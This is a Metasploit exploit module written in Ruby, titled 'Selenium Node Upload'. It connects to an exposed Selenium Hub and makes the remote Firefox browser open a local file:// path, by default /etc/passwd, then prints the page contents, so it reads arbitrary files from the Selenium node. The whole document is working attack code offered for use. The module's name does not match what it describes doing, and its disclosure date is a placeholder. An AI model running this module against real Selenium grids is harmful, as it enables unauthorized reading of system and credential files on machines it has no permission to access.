##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Selenium Node Upload',
      'Description'    => %q{
        Use the browser(Firefox) on a Selenium Node to cat a file.
        Basically it uses the browser to load a text file into the browser
        then it dumps the page text.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'Jon Stratton' ],
      'References'     =>
        [
          [ 'URL', 'https://github.com/JonStratton/selenium-node-takeover-kit' ]
        ],
      'Platform'       => 'misc',
      'Targets'       => [ 
        [ 
          'Native Payload', {
            'Platform' => %w{ linux osx win unix },
            'Arch'     => ARCH_ALL
          }
        ]  
      ],
      'DisclosureDate' => "Oct ?? 2020",
      'DefaultTarget'  => 0))

    register_options(
      [ 
        OptString.new('URL', [true, 'The Selenium Hub URL. http://selenium-hub.lan:4444/wd/hub']),
        OptString.new('REMOTE_FILE', [true, 'The Remote File to cat', '/etc/passwd'])
      ])
  end

  def exploit
    begin
        require 'selenium-webdriver'
    rescue LoadError
        print_error("Failed to load selenium-webdriver. Try 'apt-get install ruby-selenium-webdriver'")
        return
    end

    url = datastore['URL']
    remote_file = datastore['REMOTE_FILE']

    caps = {
        :browserName => 'firefox'
    }
    driver = Selenium::WebDriver.for :remote, :url => url, :desired_capabilities => caps

    # Just get the local file and print it.
    driver.get('file://%s' % [remote_file])
    print(driver.page_source)
    driver.quit
  end

end
